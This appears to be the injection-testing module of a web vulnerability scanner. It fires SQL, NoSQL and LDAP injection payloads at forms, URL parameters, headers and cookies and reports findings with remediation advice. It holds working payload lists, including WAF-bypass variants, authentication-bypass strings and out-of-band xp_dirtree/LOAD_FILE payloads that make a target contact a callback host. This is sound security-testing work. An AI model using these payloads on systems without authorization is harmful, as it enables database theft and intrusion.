import httpx
import time
import re
import json as _json
from typing import List, Optional
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param, fetch
from scanner.utils.payloads import load_payloads

ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated", "odbc sql server driver",
    "pg::syntaxerror", "syntax error at or near",
    "ora-01756",
    "unrecognized token", "near \"",
    "syntax error", "sql syntax",
]

_HARDCODED_ERROR = ["'", '"', "' OR '1'='1", "\" OR \"1\"=\"1", "1 AND 1=2--"]
_HARDCODED_BLIND = ["' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)--"]
_HARDCODED_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]
_HARDCODED_BOOLEAN = [("' AND 1=1--", "' AND 1=2--")]

# Stacked query payloads (Gap 5 — technique detection)
_STACKED_PAYLOADS = [
    "'; SELECT SLEEP(2)--",
    "1; SELECT SLEEP(2)--",
    "'; WAITFOR DELAY '0:0:2'--",
]

# UNION-based version extraction (Gap 32 — exfiltration signal)
_VERSION_UNION_PAYLOADS = [
    ("' UNION SELECT @@version--", re.compile(r'(\d+\.\d+\.\d+[^\s<"]{0,40})', re.IGNORECASE)),
    ("' UNION SELECT version()--", re.compile(r'(PostgreSQL \d+\.\d+[^\s<"]{0,30}|MariaDB[^\s<"]{0,40})', re.IGNORECASE)),
    ("' UNION SELECT NULL,@@version--", re.compile(r'(\d+\.\d+\.\d+[^\s<"]{0,40})', re.IGNORECASE)),
]

# Error-based version extraction
_VERSION_ERROR_RE = re.compile(
    r'(MySQL[\s\w./\-]{0,40}\d+\.\d+|PostgreSQL \d+\.\d+|Microsoft SQL Server \d+|Oracle Database \d+)',
    re.IGNORECASE,
)

# NoSQL operator payloads for URL params
NOSQL_PAYLOADS = [
    ('{"$gt": ""}', "application/json"),
    ('{"$ne": null}', "application/json"),
    ('{"$where": "1==1"}', "application/json"),
]

# NoSQL operator payloads for JSON request bodies (Gap 6)
_NOSQL_JSON_OPERATORS = [
    {"$gt": ""},
    {"$ne": None},
    {"$regex": ".*"},
]

LDAP_PAYLOADS = ["*)(uid=*))(|(uid=*", "*)(|(password=*))", "admin)(&)"]

# WAF bypass variants — inline comments, case mutation, space substitution
_WAF_BYPASS_ERROR = [
    "'/**/OR/**/1=1--",
    "' /*!OR*/ 1=1--",
    "' OR 1=1/*!--*/",
    "'%09OR%091=1--",
    "' OR 0x313d31--",
]
_WAF_BYPASS_UNION = [
    "' /*!UNION*/ /*!SELECT*/ NULL--",
    "' UNION/**/SELECT/**/NULL--",
    "' UnIoN SeLeCt NULL--",
    "' UNION%20SELECT%20NULL--",
]

# HTTP headers to test for injection (reflects back in error messages or delays)
_INJECTABLE_HEADERS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Custom-IP-Authorization",
]


def _load_sqli():
    data = load_payloads("sqli")
    if not data:
        return _HARDCODED_ERROR, _HARDCODED_BLIND, _HARDCODED_UNION, _HARDCODED_BOOLEAN
    try:
        error = data.get("error_payloads") or _HARDCODED_ERROR
        blind = data.get("blind_payloads") or _HARDCODED_BLIND
        union = data.get("union_payloads") or _HARDCODED_UNION
        bool_pairs = [(p["true"], p["false"]) for p in data.get("boolean_pairs", [])] or _HARDCODED_BOOLEAN
        return error, blind, union, bool_pairs
    except (KeyError, TypeError):
        return _HARDCODED_ERROR, _HARDCODED_BLIND, _HARDCODED_UNION, _HARDCODED_BOOLEAN

ERROR_PAYLOADS, BLIND_PAYLOADS, UNION_PAYLOADS, BOOLEAN_PAYLOAD_PAIRS = _load_sqli()

# DBMS-specific payload overrides
_DBMS_ERROR = {
    "mysql":    ["'", "\" OR 1=1--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"],
    "postgres": ["'", "'; SELECT pg_sleep(0)--", "' AND 1=CAST(VERSION() AS INTEGER)--"],
    "mssql":    ["'", "'; SELECT @@VERSION--", "' AND 1=CONVERT(int,@@VERSION)--"],
    "oracle":   ["'", "' OR 1=1--", "' UNION SELECT NULL FROM DUAL--"],
    "sqlite":   ["'", "' AND sqlite_version()='3'--", "' UNION SELECT sqlite_version()--"],
}
_DBMS_BLIND = {
    "mysql":    ["' AND SLEEP({t})--", "1 AND SLEEP({t})--"],
    "postgres": ["'; SELECT pg_sleep({t})--", "1; SELECT pg_sleep({t})--"],
    "mssql":    ["'; WAITFOR DELAY '0:0:{t}'--", "1; WAITFOR DELAY '0:0:{t}'--"],
    "oracle":   ["' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),{t}) END FROM DUAL)--"],
    "sqlite":   ["' AND 1=(SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)--"],
}


def _get_payloads(config):
    """Return (error_payloads, blind_payloads, union_payloads, bool_pairs) honoring dbms/level/risk."""
    level = getattr(config, "level", 1) if config else 1
    risk = getattr(config, "risk", 1) if config else 1
    dbms = getattr(config, "dbms", None) if config else None

    # Payload cap by level: 1→3, 2→5, 3→10, 4→20, 5→all
    cap = {1: 3, 2: 5, 3: 10, 4: 20, 5: 9999}.get(level, 3)

    err = (_DBMS_ERROR.get(dbms, ERROR_PAYLOADS) if dbms else ERROR_PAYLOADS)[:cap]
    union = UNION_PAYLOADS[:cap]
    bool_pairs = BOOLEAN_PAYLOAD_PAIRS[:cap]

    # Time-based payloads at risk >= 2 only — mirrors sqlmap's level/risk separation.
    # risk controls payload destructiveness (time-based can slow real user requests);
    # level controls scan depth. Matching sqlmap: --risk 2 minimum for time-based.
    if risk >= 2:
        if dbms and dbms in _DBMS_BLIND:
            delay = 5 if risk >= 3 else 3
            blind = [p.format(t=delay) for p in _DBMS_BLIND[dbms]][:cap]
        else:
            blind = BLIND_PAYLOADS[:cap]
    else:
        blind = []

    return err, blind, union, bool_pairs


def test(page: CrawlResult, client: httpx.Client, oob=None, config=None) -> List[Finding]:
    findings = []
    _test_forms(page, client, findings, config)
    _test_url_params(page, client, findings, config)
    _test_waf_bypass(page, client, findings)
    _test_header_injection(page, client, findings)
    _test_cookie_injection(page, client, findings)
    _test_nosql(page, client, findings)
    _test_nosql_json_bodies(page, client, findings)
    _test_ldap(page, client, findings)

    # Blind OOB SQLi payloads (MSSQL xp_dirtree, MySQL LOAD_FILE DNS exfil)
    if oob and not findings:
        canary = oob.get_canary()
        oob_payloads = [
            f"'; EXEC xp_dirtree '\\\\{canary}\\a'--",
            f"1; EXEC xp_dirtree '\\\\{canary}\\a'--",
            f"' AND LOAD_FILE('\\\\\\\\{canary}\\\\a')--",
            f"1 AND LOAD_FILE('\\\\\\\\{canary}\\\\a')--",
        ]
        params = get_url_params(page.url)
        for param_name in params:
            for payload in oob_payloads:
                try:
                    client.get(inject_url_param(page.url, param_name, payload), timeout=5)
                except Exception:
                    pass
        for form in page.forms:
            for inp in form["inputs"]:
                if not inp["name"]:
                    continue
                for payload in oob_payloads[:2]:
                    data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
                    data[inp["name"]] = payload
                    try:
                        client.request(form["method"].upper(), form["action"], data=data, timeout=5)
                    except Exception:
                        pass

    return findings


def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding], config=None):
    err_payloads, blind_payloads, union_payloads, bool_pairs = _get_payloads(config)

    for form in page.forms:
        input_names = [inp["name"] for inp in form["inputs"] if inp["name"]]
        if not input_names:
            continue

        # Error-based
        for payload in err_payloads:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp:
                matched = _error_match(resp.text)
                if matched:
                    db_version = _extract_version_from_error(resp.text)
                    findings.append(_sqli_finding(
                        form["action"], input_names[0], payload,
                        technique="Error-Based",
                        evidence=f"Database error signature: '{matched}'",
                        db_version=db_version,
                    ))
                    break

        # Stacked queries (Gap 5)
        for payload in _STACKED_PAYLOADS:
            data = {name: payload for name in input_names}
            elapsed = _timed_fetch(client, form["method"], form["action"], data)
            if elapsed >= 1.8:
                findings.append(_sqli_finding(
                    form["action"], input_names[0], payload,
                    technique="Stacked Queries",
                    evidence=f"Response delayed {elapsed:.1f}s after stacked query payload",
                ))
                break

        # Time-based blind (confirmed with second probe to reduce FPs)
        for payload in blind_payloads:
            data = {name: payload for name in input_names}
            elapsed = _timed_fetch(client, form["method"], form["action"], data, confirm=True)
            if elapsed >= 4.5:
                findings.append(_sqli_finding(
                    form["action"], input_names[0], payload,
                    technique="Time-Based Blind",
                    evidence=f"Response consistently delayed {elapsed:.1f}s after time-based payload",
                ))
                break


def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Finding], config=None):
    params = get_url_params(page.url)
    if not params:
        return

    err_payloads, blind_payloads, union_payloads, bool_pairs = _get_payloads(config)

    for param_name in params:
        # Error-based
        for payload in err_payloads:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp:
                matched = _error_match(resp.text)
                if matched:
                    db_version = _extract_version_from_error(resp.text)
                    findings.append(_sqli_finding(
                        page.url, param_name, payload,
                        technique="Error-Based",
                        evidence=f"Database error signature: '{matched}'",
                        db_version=db_version,
                    ))
                    break

        # UNION-based with version extraction (Gap 32)
        for union_payload, version_re in _VERSION_UNION_PAYLOADS:
            test_url = inject_url_param(page.url, param_name, union_payload)
            resp = fetch(client, "get", test_url)
            if resp:
                m = version_re.search(resp.text)
                if m:
                    findings.append(_sqli_finding(
                        page.url, param_name, union_payload,
                        technique="UNION-Based",
                        evidence=f"DB version extracted via UNION: {m.group(1)}",
                        db_version=m.group(1),
                    ))
                    break

        # Stacked queries (Gap 5)
        for payload in _STACKED_PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            elapsed = _timed_fetch(client, "get", test_url)
            if elapsed >= 1.8:
                findings.append(_sqli_finding(
                    page.url, param_name, payload,
                    technique="Stacked Queries",
                    evidence=f"Response delayed {elapsed:.1f}s after stacked query payload",
                ))
                break

        # Time-based blind (confirmed with second probe to reduce FPs)
        for payload in blind_payloads:
            test_url = inject_url_param(page.url, param_name, payload)
            elapsed = _timed_fetch(client, "get", test_url, confirm=True)
            if elapsed >= 4.5:
                findings.append(_sqli_finding(
                    page.url, param_name, payload,
                    technique="Time-Based Blind",
                    evidence=f"Response consistently delayed {elapsed:.1f}s after time-based payload",
                ))
                break

        # Boolean-based blind — compare TRUE/FALSE responses against a baseline
        # (clean request) to rule out natural page variation before attributing
        # the diff to injection.
        for true_payload, false_payload in bool_pairs:
            try:
                r_base  = client.get(inject_url_param(page.url, param_name, "1"))
                r_true  = client.get(inject_url_param(page.url, param_name, true_payload))
                r_false = client.get(inject_url_param(page.url, param_name, false_payload))
                if r_true.status_code != 200 or r_false.status_code != 200:
                    continue
                base_len  = len(r_base.text)
                true_len  = len(r_true.text)
                false_len = len(r_false.text)
                tf_diff   = abs(true_len - false_len)
                # Only report if TRUE/FALSE differ significantly AND at least one
                # differs from the baseline (ruling out pages that are just large).
                if tf_diff > 100 and (
                    abs(true_len - base_len) > 50 or abs(false_len - base_len) > 50
                ):
                    findings.append(_sqli_finding(
                        page.url, param_name, true_payload,
                        technique="Boolean-Based Blind",
                        evidence=(
                            f"TRUE={true_len}B vs FALSE={false_len}B (diff {tf_diff}B); "
                            f"baseline={base_len}B"
                        ),
                    ))
                    break
            except Exception:
                continue


def _test_nosql(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    content_type = page.headers.get("content-type", "")
    if "json" not in content_type and "javascript" not in content_type:
        return

    for param_name in get_url_params(page.url):
        # Baseline: clean request with original param value
        try:
            baseline = client.get(page.url)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            continue

        for payload, ct in NOSQL_PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            try:
                resp = client.get(test_url)
            except Exception:
                continue
            # Only report if the injection produced a meaningfully different response
            # (status change or significant body length difference vs. baseline).
            status_changed = resp.status_code != baseline_status
            len_diff = abs(len(resp.text) - baseline_len)
            if resp.status_code == 200 and (status_changed or len_diff > 200):
                findings.append(Finding(
                    title="NoSQL Injection (URL Parameter)",
                    severity=Severity.CRITICAL,
                    url=page.url,
                    parameter=param_name,
                    payload=payload,
                    evidence=(
                        f"NoSQL operator caused behavioral change: "
                        f"baseline={baseline_status}/{baseline_len}B, "
                        f"injected={resp.status_code}/{len(resp.text)}B"
                    ),
                    description="NoSQL injection allows attackers to bypass authentication or extract data from NoSQL databases (MongoDB, etc.).",
                    remediation="Validate and sanitize all inputs. Use typed schemas. Never pass raw user input as query operators.",
                    cwe="CWE-943",
                    cvss=9.8,
                    owasp_category="A03:2021 Injection",
                    standards=["ISO27001-8.23", "HIPAA-164.312a"],
                    confidence=0.75,
                ))
                break


def _test_nosql_json_bodies(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    """Gap 6 — inject NoSQL operators into JSON request bodies."""
    for form in page.forms:
        inputs = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
        if not inputs:
            continue

        # Build baseline JSON body
        baseline_resp = None
        try:
            baseline_resp = client.request(
                form["method"].upper(), form["action"],
                json=inputs, headers={"Content-Type": "application/json"}, timeout=10,
            )
        except Exception:
            continue

        if not baseline_resp or baseline_resp.status_code not in (200, 201, 401, 403):
            continue

        baseline_len = len(baseline_resp.text)

        for field_name in inputs:
            for operator in _NOSQL_JSON_OPERATORS:
                injected = dict(inputs)
                injected[field_name] = operator
                try:
                    resp = client.request(
                        form["method"].upper(), form["action"],
                        json=injected, headers={"Content-Type": "application/json"}, timeout=10,
                    )
                except Exception:
                    continue

                # Successful bypass: was 401/403, now 200 — or significantly different body
                bypassed = (
                    baseline_resp.status_code in (401, 403) and resp.status_code == 200
                ) or (
                    resp.status_code == 200 and abs(len(resp.text) - baseline_len) > 200
                )
                if bypassed:
                    findings.append(Finding(
                        title="NoSQL Injection (JSON Body)",
                        severity=Severity.CRITICAL,
                        url=form["action"],
                        parameter=field_name,
                        payload=_json.dumps({field_name: operator}),
                        evidence=(
                            f"JSON body injection with operator {operator} changed response: "
                            f"baseline={baseline_resp.status_code}/{baseline_len}B → "
                            f"injected={resp.status_code}/{len(resp.text)}B"
                        ),
                        description=(
                            "NoSQL injection in JSON request body allows attackers to bypass "
                            "authentication or manipulate queries by injecting MongoDB-style "
                            "operator objects (e.g., {\"$gt\": \"\"}) into field values."
                        ),
                        remediation=(
                            "Validate that all JSON field values are of the expected scalar type "
                            "(string/number/boolean). Reject objects in string fields. "
                            "Use ODM-level input sanitization."
                        ),
                        cwe="CWE-943",
                        cvss=9.8,
                        owasp_category="A03:2021 Injection",
                        standards=["ISO27001-8.23", "HIPAA-164.312a"],
                        confidence=0.80,
                    ))
                    break


def _test_ldap(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    for form in page.forms:
        input_names = [i["name"] for i in form["inputs"] if i["name"]]
        if not input_names:
            continue
        for payload in LDAP_PAYLOADS:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp and resp.status_code == 200 and _looks_like_ldap_bypass(resp.text):
                findings.append(Finding(
                    title="LDAP Injection",
                    severity=Severity.CRITICAL,
                    url=form["action"],
                    parameter=input_names[0],
                    payload=payload,
                    evidence="LDAP injection payload returned successful response (possible authentication bypass)",
                    description="LDAP injection allows authentication bypass or directory traversal against LDAP/Active Directory backends.",
                    remediation="Escape all special LDAP characters in user input. Use parameterized LDAP queries.",
                    cwe="CWE-90",
                    cvss=9.8,
                    owasp_category="A03:2021 Injection",
                    standards=["ISO27001-8.8", "HIPAA-164.312a"],
                    confidence=0.65,
                ))
                break


def _looks_like_ldap_bypass(body: str) -> bool:
    success_hints = ["welcome", "dashboard", "logged in", "profile", "account", "home"]
    return any(h in body.lower() for h in success_hints)


def _error_match(body: str) -> Optional[str]:
    body_lower = body.lower()
    return next((s for s in ERROR_SIGNATURES if s in body_lower), None)


def _extract_version_from_error(body: str) -> Optional[str]:
    """Gap 32 — extract DB version string from error message."""
    m = _VERSION_ERROR_RE.search(body)
    return m.group(1) if m else None


def _timed_fetch(client: httpx.Client, method: str, url: str, data: Optional[dict] = None, confirm: bool = False) -> float:
    """Return elapsed seconds; if confirm=True, run a second probe and return the maximum.

    Using max() (not min()) ensures both probes must be slow before we conclude the
    delay is genuine — network jitter typically affects only one of two back-to-back
    requests, whereas a real SLEEP() will delay both.
    """
    def _once() -> float:
        try:
            start = time.time()
            if method == "post":
                client.post(url, data=data or {})
            else:
                client.get(url)
            return time.time() - start
        except Exception:
            return 0.0

    first = _once()
    if not confirm or first < 4.5:
        return first
    second = _once()
    # Both must be slow; return the lower to be conservative (requires both >= threshold)
    return second if second >= 4.5 else 0.0


def _test_waf_bypass(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    """Test WAF bypass variants when standard payloads find nothing."""
    params = get_url_params(page.url)
    if not params:
        return
    for param_name in params:
        for payload in _WAF_BYPASS_ERROR:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp:
                matched = _error_match(resp.text)
                if matched:
                    findings.append(_sqli_finding(
                        page.url, param_name, payload,
                        technique="Error-Based (WAF Bypass)",
                        evidence=f"DB error after WAF-bypass payload: '{matched}'",
                    ))
                    return
        for payload in _WAF_BYPASS_UNION:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp:
                m = _VERSION_ERROR_RE.search(resp.text)
                if m:
                    findings.append(_sqli_finding(
                        page.url, param_name, payload,
                        technique="UNION-Based (WAF Bypass)",
                        evidence=f"DB version via WAF-bypass UNION: {m.group(1)}",
                        db_version=m.group(1),
                    ))
                    return


def _test_header_injection(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    """Test time-based SQLi in common HTTP request headers."""
    blind_payload = "' AND SLEEP(5)--"
    baseline = _timed_fetch(client, "get", page.url)
    for header in _INJECTABLE_HEADERS:
        try:
            start = time.time()
            client.get(page.url, headers={header: blind_payload}, timeout=12)
            elapsed = time.time() - start
        except Exception:
            continue
        if elapsed >= 4.5 and elapsed > baseline + 3:
            # Confirm with a second probe
            try:
                start = time.time()
                client.get(page.url, headers={header: blind_payload}, timeout=12)
                elapsed2 = time.time() - start
            except Exception:
                continue
            if elapsed2 >= 4.5:
                findings.append(_sqli_finding(
                    page.url, header, blind_payload,
                    technique="Time-Based Blind (Header)",
                    evidence=f"Request delayed {elapsed:.1f}s/{elapsed2:.1f}s when injecting into {header} header",
                ))
                return


def _test_cookie_injection(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    """Test SQLi payloads in cookie values that look like IDs or session params."""
    cookies = dict(client.cookies)
    if not cookies:
        return
    _id_re = re.compile(r'\d+|[a-f0-9]{8,}', re.IGNORECASE)
    for name, value in list(cookies.items()):
        if not _id_re.search(value):
            continue
        for payload in ["'", "' OR 1=1--", "' AND SLEEP(3)--"]:
            try:
                resp = client.get(page.url, cookies={**cookies, name: payload}, timeout=8)
            except Exception:
                continue
            matched = _error_match(resp.text)
            if matched:
                findings.append(_sqli_finding(
                    page.url, f"Cookie:{name}", payload,
                    technique="Error-Based (Cookie)",
                    evidence=f"DB error after cookie injection: '{matched}'",
                ))
                return


def _sqli_finding(
    url: str,
    param: str,
    payload: str,
    technique: str,
    evidence: str,
    db_version: Optional[str] = None,
) -> Finding:
    """Gap 5 — unified SQLi finding with confirmed technique in title and evidence."""
    version_note = f" DB version: {db_version}." if db_version else ""
    return Finding(
        title=f"SQL Injection ({technique})",
        severity=Severity.CRITICAL,
        url=url,
        parameter=param,
        payload=payload,
        evidence=evidence + version_note,
        description=(
            f"SQL injection ({technique.lower()}) confirmed. Attackers can read, modify, "
            "or delete database data, and potentially escalate to OS-level access."
        ),
        remediation=(
            "Use parameterized queries / prepared statements. "
            "Never concatenate user input into SQL strings. "
            "Apply least-privilege DB accounts."
        ),
        cwe="CWE-89",
        cvss=9.8,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32", "APPI-Art20"],
        confidence=1.0,
    )
